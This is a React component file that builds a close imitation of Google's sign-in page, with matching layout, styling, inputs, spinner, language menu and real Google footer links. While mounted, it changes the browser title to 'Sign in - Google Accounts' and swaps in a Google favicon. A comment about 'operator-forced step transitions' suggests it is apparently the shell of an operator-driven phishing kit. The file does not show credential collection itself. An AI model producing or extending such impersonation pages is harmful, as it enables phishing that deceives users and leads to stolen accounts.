import React, { useState, useEffect, useRef } from "react";
import { styled, keyframes } from "styled-components";
import { GOOGLE_CONFIG } from "../../utils/googleConfig";

// ============ Animations ============
const rotate = keyframes`
  100% { transform: rotate(360deg); }
`;

// ============ Layout ============
const PageWrap = styled.div`
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: flex;
  flex-direction: column;
  background-color: #f0f4f9;
  font-family: Roboto, Arial, sans-serif;
  color: #1f1f1f;
  overflow-y: auto;

  @media (max-width: 479.98px) {
    background-color: #ffffff;
  }
`;

const MainArea = styled.div`
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;

  @media (max-width: 479.98px) {
    padding: 0;
    align-items: stretch;
  }
`;

const Card = styled.div`
  background: #ffffff;
  border-radius: 28px;
  padding: 36px 40px 28px;
  width: 100%;
  max-width: 880px;
  min-height: 500px;
  display: flex;
  flex-direction: column;

  @media (max-width: 767.98px) {
    max-width: 450px;
    min-height: 384px;
    padding: 36px 40px;
  }

  @media (max-width: 479.98px) {
    max-width: 100%;
    border-radius: 0;
    padding: 24px 24px 36px;
    min-height: auto;
    flex: 1;
  }
`;

const LogoImg = styled.img`
  height: 40px;
  width: 40px;
  margin-bottom: 16px;
`;

const LoaderWrap = styled.div`
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 260px;
`;

// ============ Two-column primitives (desktop) ============
export const GContent = styled.div`
  display: flex;
  gap: 48px;
  flex: 1;

  @media (max-width: 767.98px) {
    flex-direction: column;
    gap: 0;
  }
`;

export const GLeft = styled.div`
  flex: 1;
  min-width: 0;
`;

export const GRight = styled.div`
  width: 400px;
  flex-shrink: 0;

  @media (max-width: 767.98px) {
    width: 100%;
  }
`;

export const GActions = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  margin-top: auto;
  padding-top: 48px;

  @media (max-width: 767.98px) {
    padding-top: 32px;
  }
`;

// ============ Footer ============
const Footer = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 8px 24px 16px;
  font-size: 12px;
  color: #1f1f1f;
  position: relative;

  @media (max-width: 479.98px) {
    background: #f0f4f9;
  }
`;

const LangWrap = styled.div`
  position: relative;
`;

const LangButton = styled.button`
  background: none;
  border: none;
  font-size: 12px;
  color: #1f1f1f;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 4px;
  padding: 8px;
  border-radius: 4px;
  font-family: Roboto, Arial, sans-serif;

  &:hover {
    background: rgba(0, 0, 0, 0.05);
  }
`;

const LangMenu = styled.div`
  position: absolute;
  bottom: 100%;
  left: 0;
  margin-bottom: 4px;
  background: #fff;
  border-radius: 4px;
  box-shadow: 0 2px 6px 2px rgba(60, 64, 67, 0.15);
  min-width: 200px;
  padding: 8px 0;
  z-index: 10;
`;

const LangItem = styled.button`
  display: block;
  width: 100%;
  text-align: left;
  background: none;
  border: none;
  padding: 8px 16px;
  font-size: 12px;
  color: ${(p) => (p.$active ? "#0b57d0" : "#1f1f1f")};
  cursor: pointer;
  font-family: Roboto, Arial, sans-serif;

  &:hover {
    background: rgba(0, 0, 0, 0.05);
  }
`;

const FooterLinks = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;

  a {
    font-size: 12px;
    color: #1f1f1f;
    padding: 8px;
    border-radius: 4px;

    &:hover {
      background: rgba(0, 0, 0, 0.05);
    }
  }
`;

// ============ Typography ============
export const GTitle = styled.h1`
  font-family: "Google Sans", Roboto, Arial, sans-serif;
  font-size: 44px;
  font-weight: 400;
  line-height: 1.16667;
  color: #1f1f1f;
  margin: 0 0 12px;
  padding: 0;

  @media (max-width: 479.98px) {
    font-size: 36px;
  }
`;

export const GSubtitle = styled.div`
  font-size: 16px;
  line-height: 1.5;
  color: #1f1f1f;
`;

export const GBody = styled.div`
  font-size: 14px;
  line-height: 1.4286;
  color: #444746;
`;

// ============ Input (floating label) ============
const InputWrap = styled.div`
  position: relative;
  width: 100%;
  margin-bottom: 4px;
`;

const StyledInput = styled.input`
  width: 100%;
  height: 56px;
  border: ${(p) => (p.$error ? "2px solid #d93025" : "1px solid #747775")};
  border-radius: 4px;
  padding: ${(p) => (p.$error ? "13px 15px" : "13px 16px")};
  font-size: 16px;
  font-family: Roboto, Arial, sans-serif;
  color: #1f1f1f;
  background: transparent;
  outline: none;
  caret-color: #0b57d0;

  &:focus {
    border: 2px solid ${(p) => (p.$error ? "#d93025" : "#0b57d0")};
    padding: 13px 15px;
  }

  &:disabled {
    color: #444746;
  }
`;

const FloatingLabel = styled.label`
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 16px;
  color: ${(p) => (p.$error ? "#d93025" : "#444746")};
  background: #ffffff;
  padding: 0 4px;
  pointer-events: none;
  transition: all 0.15s ease;
  font-family: Roboto, Arial, sans-serif;

  ${StyledInput}:focus ~ & {
    top: 0;
    font-size: 12px;
    color: ${(p) => (p.$error ? "#d93025" : "#0b57d0")};
  }

  ${StyledInput}:not(:placeholder-shown) ~ & {
    top: 0;
    font-size: 12px;
  }
`;

// ============ Buttons ============
export const NextButton = styled.button`
  background: #0b57d0;
  color: #ffffff;
  border: none;
  border-radius: 20px;
  font-size: 14px;
  font-weight: 500;
  font-family: Roboto, Arial, sans-serif;
  padding: 10px 24px;
  min-width: 84px;
  height: 40px;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  transition: background 0.2s, box-shadow 0.2s;

  &:hover:not(:disabled) {
    background: #0842a0;
    box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3),
      0 1px 3px 1px rgba(60, 64, 67, 0.15);
  }

  &:disabled {
    opacity: 0.7;
    cursor: default;
  }
`;

export const TextButton = styled.button`
  background: none;
  border: none;
  color: #0b57d0;
  font-size: 14px;
  font-weight: 500;
  font-family: Roboto, Arial, sans-serif;
  padding: 10px 12px;
  border-radius: 20px;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 6px;

  &:hover:not(:disabled) {
    background: rgba(11, 87, 208, 0.08);
  }

  &:disabled {
    opacity: 0.6;
    cursor: default;
  }
`;

export const ButtonRow = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-top: 32px;
`;

export const ButtonRowEnd = styled.div`
  display: flex;
  align-items: center;
  justify-content: flex-end;
  gap: 8px;
  margin-top: 32px;
`;

// ============ Error ============
const ErrorWrap = styled.div`
  display: flex;
  align-items: flex-start;
  gap: 6px;
  color: #d93025;
  font-size: 12px;
  line-height: 1.3333;
  margin-top: 6px;
  font-family: Roboto, Arial, sans-serif;

  svg {
    flex-shrink: 0;
    margin-top: 1px;
  }
`;

// ============ Email chip ============
const Chip = styled.button`
  display: inline-flex;
  align-items: center;
  gap: 8px;
  border: 1px solid #747775;
  border-radius: 16px;
  background: none;
  padding: 5px 12px;
  font-size: 14px;
  font-family: Roboto, Arial, sans-serif;
  color: #1f1f1f;
  cursor: pointer;
  margin-bottom: 24px;

  &:hover {
    background: rgba(0, 0, 0, 0.04);
  }
`;

// ============ Shared small components ============

const SpinnerSvg = styled.svg`
  animation: ${rotate} 1s linear infinite;
`;

export const GoogleSpinner = ({ color = "#0b57d0", size = 20 }) => (
  <SpinnerSvg width={size} height={size} viewBox="0 0 24 24">
    <circle
      cx="12"
      cy="12"
      r="9"
      fill="none"
      stroke={color}
      strokeWidth="2.5"
      strokeDasharray="42.4"
      strokeDashoffset="21.2"
      strokeLinecap="round"
    />
  </SpinnerSvg>
);

export const GError = ({ children }) => (
  <ErrorWrap>
    <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
    </svg>
    <span>{children}</span>
  </ErrorWrap>
);

export const GoogleInput = ({
  label,
  value,
  onChange,
  type = "text",
  error = false,
  disabled = false,
  autoFocus = false,
  name,
  autoComplete,
}) => (
  <InputWrap>
    <StyledInput
      id={name}
      name={name}
      type={type}
      placeholder=" "
      value={value}
      onChange={onChange}
      $error={error}
      disabled={disabled}
      autoFocus={autoFocus}
      autoComplete={autoComplete}
      spellCheck="false"
    />
    <FloatingLabel htmlFor={name} $error={error}>
      {label}
    </FloatingLabel>
  </InputWrap>
);

export const EmailChip = ({ email, onClick }) => (
  <Chip type="button" onClick={onClick}>
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
    </svg>
    <span>{email}</span>
    <svg width="16" height="16" viewBox="0 0 24 24" fill="#444746">
      <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
    </svg>
  </Chip>
);

const LANGUAGES = [
  "English (United States)",
  "English (United Kingdom)",
  "Español",
  "Português (Brasil)",
  "Français",
  "Deutsch",
  "Italiano",
];

/**
 * Shared Google sign-in page shell: background, card, logo, footer,
 * document title/favicon swap, and initial mount loading spinner.
 * Desktop uses the authentic wide two-column card (compose with
 * GContent / GLeft / GRight / GActions); collapses to single column
 * on narrow screens.
 */
export default function GoogleShell({ children, initialLoading = true }) {
  const [booting, setBooting] = useState(initialLoading);
  const [lang, setLang] = useState(LANGUAGES[0]);
  const [langOpen, setLangOpen] = useState(false);
  const langRef = useRef(null);

  // Swap title + favicon to Google while mounted
  useEffect(() => {
    const prevTitle = document.title;
    const icon = document.querySelector("link[rel='icon']");
    const prevIcon = icon ? icon.getAttribute("href") : null;

    document.title = "Sign in - Google Accounts";
    if (icon) icon.setAttribute("href", "/google.svg");

    return () => {
      document.title = prevTitle;
      if (icon && prevIcon) icon.setAttribute("href", prevIcon);
    };
  }, []);

  // Mount loading delay (covers operator-forced step transitions)
  useEffect(() => {
    if (!initialLoading) return undefined;
    const timer = setTimeout(() => setBooting(false), GOOGLE_CONFIG.VIEW_DELAY);
    return () => clearTimeout(timer);
  }, [initialLoading]);

  // Close language menu on outside click
  useEffect(() => {
    if (!langOpen) return undefined;
    const close = (e) => {
      if (langRef.current && !langRef.current.contains(e.target)) {
        setLangOpen(false);
      }
    };
    document.addEventListener("mousedown", close);
    return () => document.removeEventListener("mousedown", close);
  }, [langOpen]);

  return (
    <PageWrap>
      <MainArea>
        <Card>
          <LogoImg src="/google.svg" alt="" />
          {booting ? (
            <LoaderWrap>
              <GoogleSpinner size={32} />
            </LoaderWrap>
          ) : (
            children
          )}
        </Card>
      </MainArea>
      <Footer>
        <LangWrap ref={langRef}>
          <LangButton type="button" onClick={() => setLangOpen((o) => !o)}>
            {lang}
            <svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor">
              <path d="M7 10l5 5 5-5z" />
            </svg>
          </LangButton>
          {langOpen && (
            <LangMenu>
              {LANGUAGES.map((l) => (
                <LangItem
                  key={l}
                  type="button"
                  $active={l === lang}
                  onClick={() => {
                    setLang(l);
                    setLangOpen(false);
                  }}
                >
                  {l}
                </LangItem>
              ))}
            </LangMenu>
          )}
        </LangWrap>
        <FooterLinks>
          <a
            href="https://support.google.com/accounts"
            target="_blank"
            rel="noreferrer"
          >
            Help
          </a>
          <a
            href="https://policies.google.com/privacy"
            target="_blank"
            rel="noreferrer"
          >
            Privacy
          </a>
          <a
            href="https://policies.google.com/terms"
            target="_blank"
            rel="noreferrer"
          >
            Terms
          </a>
        </FooterLinks>
      </Footer>
    </PageWrap>
  );
}
